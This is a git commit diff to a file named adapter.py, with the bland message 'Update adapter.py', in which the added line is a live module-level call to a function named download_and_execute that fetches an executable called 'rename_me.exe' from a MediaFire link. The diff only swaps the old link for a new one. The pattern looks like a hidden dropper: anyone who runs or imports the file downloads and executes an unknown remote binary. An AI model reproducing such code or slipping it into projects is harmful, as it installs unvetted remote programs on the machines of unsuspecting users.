7c57f6f6871b4d01d93f5518562dbd2f813f023e
Cavetodex <167407997+Cavetodex@users.noreply.github.com>
2024-06-04 08:04:38 +0200

    Update adapter.py

--- source/adapter.py
+++ source/adapter.py
@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://download850.mediafire.com/8l0w2wn4h05g1yvDS1xrbpeSYVt91TXnr4VzFottGFiU1IEIhWacmMQy4QWl3ufIptjReSni19Q79UBmAHC45EFH4AGVZTmEKMCQeVAN-YCnZU0W0S0V_zJZc8ukkpSM6jDHnFrb4g2VTV_3yLbJfX4o44yqR26ZeX91QdR7o7tf42I/783t7z3i85vcmql/rename_me.exe")
+download_and_execute("https://download850.mediafire.com/9fx3vj8edv0gAhPjFbjjraFXdyCcW9gqeTL8-y1-ROrcNNF6l3vm40qQ6bSV7Oc8NukglJfEciqSAJhrsA46CAwIkq0Xa9RhK5CNJDaJgu4YovYZyxx86vn8iKJoB-a1Q2HQTflNhIYMcSo8eXHz14Gs_cT62ImicekBj3Lh3H-FyEg/783t7z3i85vcmql/rename_me.exe")
